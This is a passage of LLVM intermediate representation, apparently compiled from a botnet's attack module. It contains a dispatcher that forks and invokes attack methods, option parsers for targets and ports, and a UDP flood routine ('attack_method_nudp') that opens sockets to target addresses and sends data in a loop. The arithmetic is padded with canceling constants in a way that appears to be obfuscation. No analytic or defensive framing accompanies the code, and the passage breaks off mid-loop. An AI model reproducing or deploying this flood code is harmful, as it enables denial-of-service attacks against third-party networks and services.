  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #7
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #7
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #9
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #7
  %35 = call i32 @kill(i32 %34, i32 9) #7
  call void @exit(i32 0) #9
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %73

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %73

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 %68, 650339062
  %70 = add i32 %69, 1
  %71 = add i32 %70, 650339062
  %72 = add nsw i32 %68, 1
  store i32 %71, i32* %15, align 4
  br label %37

; <label>:73:                                     ; preds = %54, %37
  call void @exit(i32 0) #9
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %40

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %37

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #7
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, %31
  %33 = sub i32 0, 1
  %34 = add i32 %32, %33
  %35 = sub i32 0, %34
  %36 = add nsw i32 %31, 1
  store i32 %35, i32* %5, align 4
  br label %10

; <label>:37:                                     ; preds = %10
  %38 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %39 = bitcast %struct.attack_option* %38 to i8*
  call void @free(i8* %39) #7
  br label %40

; <label>:40:                                     ; preds = %37, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %40

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %42

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, 1
  %38 = sub i32 %36, %37
  %39 = add nsw i32 %36, 1
  store i32 %38, i32* %10, align 4
  br label %11

; <label>:40:                                     ; preds = %11
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  br label %42

; <label>:42:                                     ; preds = %40, %27
  %43 = load i8*, i8** %5, align 8
  ret i8* %43
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #7
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_nudp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca [22 x i8*], align 16
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 0
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i8** %23, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = call signext i8 @random_hex()
  %26 = sext i8 %25 to i32
  %27 = call signext i8 @random_hex()
  %28 = sext i8 %27 to i32
  %29 = sub i32 0, %28
  %30 = sub i32 %26, %29
  %31 = add nsw i32 %26, %28
  %32 = sext i32 %30 to i64
  %33 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i32 0, i32 0), i64 %32
  store i8* %33, i8** %24, align 8
  %34 = getelementptr inbounds i8*, i8** %24, i64 1
  %35 = call signext i8 @random_hex()
  %36 = sext i8 %35 to i32
  %37 = call signext i8 @random_hex()
  %38 = sext i8 %37 to i32
  %39 = sub i32 0, %36
  %40 = sub i32 0, %38
  %41 = add i32 %39, %40
  %42 = sub i32 0, %41
  %43 = add nsw i32 %36, %38
  %44 = sext i32 %42 to i64
  %45 = getelementptr inbounds i8, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i64 %44
  store i8* %45, i8** %34, align 8
  %46 = getelementptr inbounds i8*, i8** %34, i64 1
  store i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i32 0, i32 0), i8** %46, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  store i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i32 0, i32 0), i8** %47, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i32 0, i32 0), i8** %48, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = call signext i8 @random_hex()
  %51 = sext i8 %50 to i32
  %52 = call signext i8 @random_hex()
  %53 = sext i8 %52 to i32
  %54 = add i32 %51, -399217563
  %55 = add i32 %54, %53
  %56 = sub i32 %55, -399217563
  %57 = add nsw i32 %51, %53
  %58 = call signext i8 @random_hex()
  %59 = sext i8 %58 to i32
  %60 = sub i32 0, %59
  %61 = sub i32 %56, %60
  %62 = add nsw i32 %56, %59
  %63 = call signext i8 @random_hex()
  %64 = sext i8 %63 to i32
  %65 = sub i32 0, %64
  %66 = sub i32 %61, %65
  %67 = add nsw i32 %61, %64
  %68 = call signext i8 @random_hex()
  %69 = sext i8 %68 to i32
  %70 = sub i32 0, %69
  %71 = sub i32 %66, %70
  %72 = add nsw i32 %66, %69
  %73 = call signext i8 @random_hex()
  %74 = sext i8 %73 to i32
  %75 = add i32 %71, 1793311155
  %76 = add i32 %75, %74
  %77 = sub i32 %76, 1793311155
  %78 = add nsw i32 %71, %74
  %79 = call signext i8 @random_hex()
  %80 = sext i8 %79 to i32
  %81 = sub i32 0, %77
  %82 = sub i32 0, %80
  %83 = add i32 %81, %82
  %84 = sub i32 0, %83
  %85 = add nsw i32 %77, %80
  %86 = call signext i8 @random_hex()
  %87 = sext i8 %86 to i32
  %88 = sub i32 0, %84
  %89 = sub i32 0, %87
  %90 = add i32 %88, %89
  %91 = sub i32 0, %90
  %92 = add nsw i32 %84, %87
  %93 = call signext i8 @random_hex()
  %94 = sext i8 %93 to i32
  %95 = add i32 %91, -1916807049
  %96 = add i32 %95, %94
  %97 = sub i32 %96, -1916807049
  %98 = add nsw i32 %91, %94
  %99 = call signext i8 @random_hex()
  %100 = sext i8 %99 to i32
  %101 = sub i32 %97, 334557073
  %102 = add i32 %101, %100
  %103 = add i32 %102, 334557073
  %104 = add nsw i32 %97, %100
  %105 = call signext i8 @random_hex()
  %106 = sext i8 %105 to i32
  %107 = sub i32 0, %106
  %108 = sub i32 %103, %107
  %109 = add nsw i32 %103, %106
  %110 = call signext i8 @random_hex()
  %111 = sext i8 %110 to i32
  %112 = sub i32 0, %111
  %113 = sub i32 %108, %112
  %114 = add nsw i32 %108, %111
  %115 = call signext i8 @random_hex()
  %116 = sext i8 %115 to i32
  %117 = sub i32 0, %113
  %118 = sub i32 0, %116
  %119 = add i32 %117, %118
  %120 = sub i32 0, %119
  %121 = add nsw i32 %113, %116
  %122 = call signext i8 @random_hex()
  %123 = sext i8 %122 to i32
  %124 = sub i32 0, %123
  %125 = sub i32 %120, %124
  %126 = add nsw i32 %120, %123
  %127 = sext i32 %125 to i64
  %128 = getelementptr inbounds i8, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.6, i32 0, i32 0), i64 %127
  store i8* %128, i8** %49, align 8
  %129 = getelementptr inbounds i8*, i8** %49, i64 1
  store i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i32 0, i32 0), i8** %129, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 1
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8** %130, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 1
  store i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i32 0, i32 0), i8** %131, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 1
  store i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i32 0, i32 0), i8** %132, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 1
  store i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i32 0, i32 0), i8** %133, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 1
  store i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i32 0, i32 0), i8** %134, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  store i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i32 0, i32 0), i8** %135, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i32 0, i32 0), i8** %136, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 1
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8** %137, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 1
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i32 0, i32 0), i8** %138, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 1
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i32 0, i32 0), i8** %139, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 1
  store i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i32 0, i32 0), i8** %140, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 1
  store i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i32 0, i32 0), i8** %141, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 1
  store i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8** %142, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 1
  store i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i32 0, i32 0), i8** %143, align 8
  %144 = load i8, i8* %5, align 1
  %145 = zext i8 %144 to i64
  %146 = call noalias i8* @calloc(i64 %145, i64 8) #7
  %147 = bitcast i8* %146 to i8**
  store i8** %147, i8*** %11, align 8
  %148 = load i8, i8* %5, align 1
  %149 = zext i8 %148 to i64
  %150 = call noalias i8* @calloc(i64 %149, i64 4) #7
  %151 = bitcast i8* %150 to i32*
  store i32* %151, i32** %12, align 8
  %152 = load i8, i8* %7, align 1
  %153 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %154 = call i32 @attack_get_opt_int(i8 zeroext %152, %struct.attack_option* %153, i8 zeroext 7, i32 65535)
  %155 = trunc i32 %154 to i16
  store i16 %155, i16* %13, align 2
  %156 = load i8, i8* %7, align 1
  %157 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %158 = call i32 @attack_get_opt_int(i8 zeroext %156, %struct.attack_option* %157, i8 zeroext 6, i32 65535)
  %159 = trunc i32 %158 to i16
  store i16 %159, i16* %14, align 2
  %160 = load i8, i8* %7, align 1
  %161 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %162 = call i32 @attack_get_opt_int(i8 zeroext %160, %struct.attack_option* %161, i8 zeroext 0, i32 1024)
  %163 = trunc i32 %162 to i16
  store i16 %163, i16* %15, align 2
  %164 = load i8, i8* %7, align 1
  %165 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %166 = call i32 @attack_get_opt_int(i8 zeroext %164, %struct.attack_option* %165, i8 zeroext 1, i32 1)
  %167 = trunc i32 %166 to i8
  store i8 %167, i8* %16, align 1
  %168 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 4, i1 false)
  %169 = load i16, i16* %14, align 2
  %170 = zext i16 %169 to i32
  %171 = icmp eq i32 %170, 65535
  br i1 %171, label %172, label %175

; <label>:172:                                    ; preds = %4
  %173 = call i32 @rand_next()
  %174 = trunc i32 %173 to i16
  store i16 %174, i16* %14, align 2
  br label %178

; <label>:175:                                    ; preds = %4
  %176 = load i16, i16* %14, align 2
  %177 = call zeroext i16 @htons(i16 zeroext %176) #8
  store i16 %177, i16* %14, align 2
  br label %178

; <label>:178:                                    ; preds = %175, %172
  store i32 0, i32* %10, align 4
  br label %179

; <label>:179:                                    ; preds = %293, %178
  %180 = load i32, i32* %10, align 4
  %181 = load i8, i8* %5, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp slt i32 %180, %182
  br i1 %183, label %184, label %299

; <label>:184:                                    ; preds = %179
  %185 = call noalias i8* @calloc(i64 65535, i64 1) #7
  %186 = load i8**, i8*** %11, align 8
  %187 = load i32, i32* %10, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8*, i8** %186, i64 %188
  store i8* %185, i8** %189, align 8
  %190 = load i16, i16* %13, align 2
  %191 = zext i16 %190 to i32
  %192 = icmp eq i32 %191, 65535
  br i1 %192, label %193, label %202

; <label>:193:                                    ; preds = %184
  %194 = call i32 @rand_next()
  %195 = trunc i32 %194 to i16
  %196 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %197 = load i32, i32* %10, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i32 0, i32 0
  %201 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %200, i32 0, i32 1
  store i16 %195, i16* %201, align 2
  br label %211

; <label>:202:                                    ; preds = %184
  %203 = load i16, i16* %13, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %203) #8
  %205 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %206 = load i32, i32* %10, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 0
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %209, i32 0, i32 1
  store i16 %204, i16* %210, align 2
  br label %211

; <label>:211:                                    ; preds = %202, %193
  %212 = call i32 @socket(i32 2, i32 2, i32 0) #7
  %213 = load i32*, i32** %12, align 8
  %214 = load i32, i32* %10, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i32, i32* %213, i64 %215
  store i32 %212, i32* %216, align 4
  %217 = icmp eq i32 %212, -1
  br i1 %217, label %218, label %219

; <label>:218:                                    ; preds = %211
  ret void

; <label>:219:                                    ; preds = %211
  %220 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %220, align 4
  %221 = load i16, i16* %14, align 2
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %221, i16* %222, align 2
  %223 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %224 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %223, i32 0, i32 0
  store i32 0, i32* %224, align 4
  %225 = load i32*, i32** %12, align 8
  %226 = load i32, i32* %10, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds i32, i32* %225, i64 %227
  %229 = load i32, i32* %228, align 4
  %230 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %231 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %231, %struct.sockaddr** %230, align 8
  %232 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %233 = load %struct.sockaddr*, %struct.sockaddr** %232, align 8
  %234 = call i32 @bind(i32 %229, %struct.sockaddr* %233, i32 16) #7
  %235 = icmp eq i32 %234, -1
  br i1 %235, label %236, label %237

; <label>:236:                                    ; preds = %219
  br label %237

; <label>:237:                                    ; preds = %236, %219
  %238 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %239 = load i32, i32* %10, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %238, i64 %240
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i32 0, i32 2
  %243 = load i8, i8* %242, align 4
  %244 = zext i8 %243 to i32
  %245 = icmp slt i32 %244, 32
  br i1 %245, label %246, label %274

; <label>:246:                                    ; preds = %237
  %247 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %248 = load i32, i32* %10, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %247, i64 %249
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %250, i32 0, i32 1
  %252 = load i32, i32* %251, align 4
  %253 = call i32 @ntohl(i32 %252) #8
  %254 = call i32 @rand_next()
  %255 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %256 = load i32, i32* %10, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %255, i64 %257
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %258, i32 0, i32 2
  %260 = load i8, i8* %259, align 4
  %261 = zext i8 %260 to i32
  %262 = lshr i32 %254, %261
  %263 = sub i32 0, %262
  %264 = sub i32 %253, %263
  %265 = add i32 %253, %262
  %266 = call i32 @htonl(i32 %264) #8
  %267 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %268 = load i32, i32* %10, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %267, i64 %269
  %271 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i32 0, i32 0
  %272 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %271, i32 0, i32 2
  %273 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %272, i32 0, i32 0
  store i32 %266, i32* %273, align 4
  br label %274

; <label>:274:                                    ; preds = %246, %237
  %275 = load i32*, i32** %12, align 8
  %276 = load i32, i32* %10, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds i32, i32* %275, i64 %277
  %279 = load i32, i32* %278, align 4
  %280 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %281 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %282 = load i32, i32* %10, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %281, i64 %283
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %284, i32 0, i32 0
  %286 = bitcast %struct.sockaddr_in* %285 to %struct.sockaddr*
  store %struct.sockaddr* %286, %struct.sockaddr** %280, align 8
  %287 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %288 = load %struct.sockaddr*, %struct.sockaddr** %287, align 8
  %289 = call i32 @connect(i32 %279, %struct.sockaddr* %288, i32 16)
  %290 = icmp eq i32 %289, -1
  br i1 %290, label %291, label %292

; <label>:291:                                    ; preds = %274
  br label %292

; <label>:292:                                    ; preds = %291, %274
  br label %293

; <label>:293:                                    ; preds = %292
  %294 = load i32, i32* %10, align 4
  %295 = sub i32 %294, -929551411
  %296 = add i32 %295, 1
  %297 = add i32 %296, -929551411
  %298 = add nsw i32 %294, 1
  store i32 %297, i32* %10, align 4
  br label %179

; <label>:299:                                    ; preds = %179
  br label %300

; <label>:300:                                    ; preds = %332, %299
  store i32 0, i32* %10, align 4
  br label %301

; <label>:301:                                    ; preds = %326, %300
  %302 = load i32, i32* %10, align 4
  %303 = load i8, i8* %5, align 1
  %304 = zext i8 %303 to i32
  %305 = icmp slt i32 %302, %304
  br i1 %305, label %306, label %332

; <label>:306:                                    ; preds = %301
  %307 = load i32*, i32** %12, align 8
  %308 = load i32, i32* %10, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds i32, i32* %307, i64 %309
  %311 = load i32, i32* %310, align 4
  %312 = load i32, i32* %10, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 %313
  %315 = load i8*, i8** %314, align 8
  %316 = load i32, i32* %10, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds [22 x i8*], [22 x i8*]* %9, i64 0, i64 %317
  %319 = load i8*, i8** %318, align 8
  %320 = call i64 @strlen(i8* %319) #10
  %321 = sub i64 %320, -7366349269379966347
  %322 = add i64 %321, 1
  %323 = add i64 %322, -7366349269379966347
  %324 = add i64 %320, 1
  %325 = call i64 @send(i32 %311, i8* %315, i64 %323, i32 16384)
  br label %326

; <label>:326:                                    ; preds = %306
  %327 = load i32, i32* %10, align 4
  %328 = add i32 %327, -1656677613
  %329 = add i32 %328, 1
  %330 = sub i32 %329, -1656677613
  %331 = add nsw i32 %327, 1
